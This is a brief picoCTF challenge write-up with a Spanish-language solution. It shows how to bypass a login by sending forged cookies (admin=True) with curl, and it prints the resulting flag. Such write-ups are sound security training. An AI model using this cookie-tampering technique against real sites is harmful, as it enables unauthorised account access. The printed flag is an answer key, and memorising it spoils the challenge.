The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:157

Hints:
Hmm it doesn't seem to check anyone's password, except for Joe's?

Solución
Por medio de la función curl, modificar la cookie de sesión para poder tener acceso como administrador y poder ver la flag
```zsh
diego@Tallin: curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: user=diego; password=hola; admin=True"
| grep "picoCTF"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0    283      0  0:00:04  0:00:04 --:--:--   310
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
```
